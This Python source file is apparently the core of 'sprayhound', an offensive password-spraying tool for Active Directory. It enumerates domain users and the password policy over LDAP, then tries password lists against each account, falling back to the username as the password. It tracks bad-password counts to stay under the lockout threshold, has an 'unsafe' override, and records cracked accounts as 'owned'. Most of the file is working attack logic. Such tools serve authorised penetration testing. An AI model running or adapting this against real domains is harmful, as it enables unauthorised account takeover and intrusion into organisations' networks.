# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

import os
from sprayhound.modules.logger import Logger
from sprayhound.modules.ldapconnection import LdapConnection
from sprayhound.modules.neo4jconnection import Neo4jConnection
from sprayhound.modules.credential import Credential
from sprayhound.utils.utils import *
import time


class SprayHound:
    def __init__(self, users, passwords, threshold, looptime,
                 ldap_options,
                 neo4j_options,
                 logger_options=Logger.Options(),
                 unsafe=False
                 ):
        self.log = Logger(logger_options)
        self.ldap = LdapConnection(ldap_options, self.log)
        self.neo4j_options = neo4j_options
        self.neo4j = None
        self.credentials = []
        self.users = users
        self.passwords = passwords
        self.threshold = threshold
        self.unsafe = unsafe
        self.looptime = looptime
        self.owned = []

    def run(self):
        if not self.ldap.domain:
            return ERROR_LDAP_NOT_FQDN_DOMAIN

        if not (self.ldap.username and self.ldap.password and self.ldap.host):
            if not self.users:
                return ERROR_NO_USER_NO_LDAP
            else:
                self.log.warn("BEWARE ! You are going to test user/pass without providing a valid domain user")
                self.log.warn("Without a valid domain user, tested account may be locked out as we're not able to determine password policy and bad password count")

                answer = self.log.input("Continue anyway?", ["y", "n"], "n")
                if answer == "n":
                    self.log.warn("Wise master. Bye.")
                    sys.exit(0)
                self.get_credentials()
        else:
            try:
                self.ldap.login()
                self.log.success("Login successful")
            except Exception as e:
                self.log.error("Failed login")
                raise

            try:
                self.ldap.get_password_policy()
                self.log.success("Successfully retrieved password policy (Threshold: {})".format(self.ldap.domain_threshold))
            except Exception as e:
                self.log.error("Failed getting password policy")
                raise

            try:
                self.get_ldap_credentials()
                self.log.success("Successfully retrieved {} users".format(len(self.credentials)))
            except Exception as e:
                self.log.error("Failed getting ldap credentials")
                raise

        try:
            counter = 0
            passwords_count = len(self.credentials[0].passwords)
            while len(self.owned) != len(self.credentials) and counter < passwords_count:
                self.test_credentials()
                counter += 1
                time.sleep(self.looptime)
        except:
            raise

    def get_credentials(self):
        self.credentials = [Credential(user) for user in self.users]
        for i in range(len(self.credentials)):
            if self.passwords:
                self.credentials[i].passwords = self.passwords.copy()
            else:
                self.credentials[i].passwords = [self.credentials[i].samaccountname]

    def get_ldap_credentials(self):
        if not self.users:
            ret = self.ldap.get_users(self)
            if ret != ERROR_SUCCESS:
                return ret
        else:
            ret = self.ldap.get_users(self, users=self.users, disabled=True)
            if ret != ERROR_SUCCESS:
                return ret

        for i in range(len(self.credentials)):
            if self.passwords:
                self.credentials[i].set_password(self.passwords.copy())
            else:
                self.credentials[i].set_password([self.credentials[i].samaccountname])

        return ERROR_SUCCESS

    def test_credentials(self):
        testing_nb = len([c.is_tested(self.threshold, self.unsafe) for c in self.credentials if c.is_tested(self.threshold, self.unsafe)[0]])

        self.log.success(Logger.colorize("{} users will be tested".format(testing_nb), Logger.GREEN))
        self.log.success(Logger.colorize("{} users will not be tested".format(len(self.credentials) - testing_nb), Logger.YELLOW))
        answer = self.log.input("Continue?", ['y', 'n'], 'y')
        if answer != "y":
            self.log.warn("Ok, master. Bye.")
            return ERROR_SUCCESS

        for credential in self.credentials:
            if credential.samaccountname in self.owned:
                continue
            ret = credential.is_valid(self.ldap, self.threshold, self.unsafe)
            if ret == ERROR_SUCCESS:
                self.log.success("[  {}  ] {}".format(Logger.colorize("VALID", Logger.GREEN), Logger.highlight("{} : {}").format(credential.samaccountname, credential.passwords[0])))
                self.owned.append(credential.samaccountname)
            elif ret == ERROR_LDAP_SERVICE_UNAVAILABLE:
                return ret
            elif ret == ERROR_THRESHOLD:
                self.log.debug("[ {} ] {} : {} BadPwdCount: {}, PwdPol: {}".format(Logger.colorize("SKIPPED", Logger.BLUE), credential.samaccountname, credential.passwords[0], credential.bad_password_count+1, credential.threshold))
            elif ret == ERROR_LDAP_CREDENTIALS:
                tested_password = credential.passwords.pop(0)
                self.log.debug("[{}] {} : {} failed - BadPwdCount: {}, PwdPol: {}".format(Logger.colorize("NOT VALID", Logger.RED), credential.samaccountname, tested_password, credential.bad_password_count+1, credential.threshold))
            else:
                self.log.debug("{} : {} failed - BadPwdCount: {}, PwdPol: {} (Error {}: {})".format(credential.samaccountname, credential.passwords[0], credential.bad_password_count+1, credential.threshold, ret[0], ret[1]))

        return ERROR_SUCCESS


class CLI:
    def __init__(self):
        self.args = get_args()
        self.log_options = Logger.Options(verbosity=self.args.v)

        self.log = Logger(self.log_options)

        self.ldap_options = LdapConnection.Options(
            self.args.domain_controller,
            self.args.domain,
            self.args.ldap_user,
            self.args.ldap_pass,
            self.args.ldap_port,
            self.args.ldap_ssl,
            self.args.ldap_page_size
        )
        self.neo4j_options = Neo4jConnection.Options(
            self.args.neo4j_host,
            self.args.neo4j_user,
            self.args.neo4j_pass,
            self.args.neo4j_port,
            self.log
        )

        self.users = []
        if self.args.username:
            self.users = [self.args.username]
        elif self.args.userfile:
            if not os.path.isfile(self.args.userfile):
                sprayhound_exit(self.log, ERROR_USER_FILE_NOT_FOUND)
            with open(self.args.userfile, 'r') as f:
                self.users = [user.strip().lower() for user in f if user.strip() != ""]

        if self.args.password:
            self.passwords = [self.args.password]
        elif self.args.passwordfile:
            if not os.path.isfile(self.args.passwordfile):
                sprayhound_exit(self.log, ERROR_PASS_FILE_NOT_FOUND)
            with open(self.args.passwordfile, 'r') as f:
                self.passwords = [password.strip() for password in f if password.strip() != ""]
        self.threshold = self.args.threshold
        self.looptime = self.args.loop_time

    def run(self):
        try:
            return SprayHound(
                self.users, self.passwords, self.threshold, self.looptime,
                ldap_options=self.ldap_options,
                neo4j_options=self.neo4j_options,
                logger_options=self.log_options,
                unsafe=self.args.unsafe
            ).run()
        except Exception as e:
            self.log.error("An error occurred while executing SprayHound")
            if self.args.v == 2:
                raise
            else:
                return False


def run():
    CLI().run()
